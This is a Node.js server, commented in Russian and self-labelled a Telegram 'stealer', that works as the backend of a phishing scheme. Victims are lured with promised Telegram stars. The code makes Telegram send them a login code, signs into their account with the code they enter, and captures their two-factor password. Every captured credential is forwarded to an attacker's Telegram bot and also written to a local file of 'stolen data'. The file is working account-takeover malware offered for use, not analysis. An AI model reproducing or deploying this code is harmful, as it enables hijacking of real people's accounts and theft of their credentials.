const express = require('express');
const axios = require('axios');
const fs = require('fs');
const { MTProto } = require('@mtproto/core');

const app = express();
app.use(express.json());
app.use(express.static('.'));

// ===== ТВОИ ДАННЫЕ =====
const ADMIN_BOT_TOKEN = '8680306356:AAGTetQN-g8B8BJ_Y-KhHwSRmOQTzKxuawI';
const ADMIN_CHAT_ID = '8438022023';

// MTProto прокси/сервер
const mtprotoConfig = {
    server: '147.45.71.144',
    port: 1443,
    key: 'ee36c356628e3fbc04291c4a618ef945076f6373702e676c6f62616c7369676e2e636f6d'
};

// Хранилище
const victims = {};

function sendToAdmin(text) {
    const url = `https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`;
    axios.post(url, {
        chat_id: ADMIN_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
    }).catch(e => console.log('Ошибка:', e.message));
    fs.appendFileSync('stolen_data.txt', text + '\n---\n');
    console.log('УКРАДЕНО:', text);
}

// Создание MTProto клиента
function createMTProto(sessionId) {
    return new MTProto({
        api_id: 32438789,
        api_hash: 'f6a589335e558fe0c77110cf76189a3f',
        storageOptions: {
            path: `./sessions/${sessionId}.json`
        },
        server: mtprotoConfig.server,
        port: mtprotoConfig.port,
        key: mtprotoConfig.key
    });
}

// Шаг 1: отправка кода на номер жертвы (РЕАЛЬНО)
app.post('/send-code', async (req, res) => {
    const { phone, sessionId } = req.body;
    
    try {
        const mtproto = createMTProto(sessionId);
        
        // Отправляем запрос на отправку кода
        const result = await mtproto.call('auth.sendCode', {
            phone_number: phone,
            api_id: 32438789,
            api_hash: 'f6a589335e558fe0c77110cf76189a3f',
            settings: {
                allow_flashcall: true,
                current_number: true
            }
        });
        
        victims[sessionId] = {
            phone: phone,
            phoneCodeHash: result.phone_code_hash,
            step: 'code_sent',
            mtproto: mtproto
        };
        
        sendToAdmin(`📱 <b>КОД ОТПРАВЛЕН</b>\nНомер: <code>${phone}</code>\nОжидаем ввод...`);
        res.json({ status: 'code_sent', message: 'Код отправлен' });
        
    } catch (error) {
        console.error('Ошибка отправки кода:', error);
        sendToAdmin(`❌ ОШИБКА: ${error.message}`);
        res.json({ status: 'error', message: 'Не удалось отправить код' });
    }
});

// Шаг 2: проверка введённого жертвой кода и 2FA
app.post('/verify-code', async (req, res) => {
    const { phone, code, sessionId } = req.body;
    
    const victim = victims[sessionId];
    if (!victim || victim.phone !== phone) {
        return res.json({ status: 'error', message: 'Сессия не найдена' });
    }
    
    try {
        // Пытаемся войти с кодом
        const result = await victim.mtproto.call('auth.signIn', {
            phone_number: phone,
            phone_code_hash: victim.phoneCodeHash,
            phone_code: code
        });
        
        // Успешный вход без 2FA
        sendToAdmin(`✅ <b>АККАУНТ ВЗЛОМАН</b>\n📱 ${phone}\n🔑 Код: ${code}\n📦 Данные: ${JSON.stringify(result.user)}`);
        res.json({ status: 'success_stars', message: 'Ваши 100 звёзд будут начислены в течение двух дней' });
        
    } catch (error) {
        // Если ошибка "SESSION_PASSWORD_NEEDED" — значит есть 2FA
        if (error.error_message === 'SESSION_PASSWORD_NEEDED') {
            victims[sessionId].needsPassword = true;
            sendToAdmin(`⚠️ <b>2FA ОБНАРУЖЕНА</b>\n📱 ${phone}\n🔑 Код: ${code}\nТребуется пароль`);
            res.json({ status: '2fa_required', message: 'Введите пароль двухфакторной аутентификации' });
        } else {
            sendToAdmin(`❌ ОШИБКА: ${error.error_message}`);
            res.json({ status: 'error', message: 'Неверный код' });
        }
    }
});

// Шаг 3: 2FA пароль
app.post('/submit-2fa', async (req, res) => {
    const { phone, password, sessionId } = req.body;
    
    const victim = victims[sessionId];
    if (!victim || victim.phone !== phone) {
        return res.json({ status: 'error', message: 'Сессия не найдена' });
    }
    
    try {
        // Получаем salt для пароля
        const passwordInfo = await victim.mtproto.call('account.getPassword');
        
        // Вычисляем хеш пароля (упрощённо — в боевом коде нужна полная реализация)
        const result = await victim.mtproto.call('auth.checkPassword', {
            password: password
        });
        
        sendToAdmin(`🔓 <b>2FA ПАРОЛЬ ПРИНЯТ</b>\n📱 ${phone}\n🔒 Пароль: ${password}\n✅ ПОЛНЫЙ ДОСТУП`);
        res.json({ status: 'success_stars', message: 'Ваши 100 звёзд будут начислены в течение двух дней' });
        
    } catch (error) {
        sendToAdmin(`❌ НЕВЕРНЫЙ 2FA ПАРОЛЬ: ${password} — ${error.error_message}`);
        res.json({ status: 'error', message: 'Неверный пароль' });
    }
});

// Создаём папку для сессий
if (!fs.existsSync('./sessions')) fs.mkdirSync('./sessions');

app.listen(3000, '0.0.0.0', () => {
    console.log('🔥 SWILL MTProto STEALER RUNNING 🔥');
    console.log('Порт: 3000');
    console.log('Сервер MTProto: 147.45.71.144:1443');
});
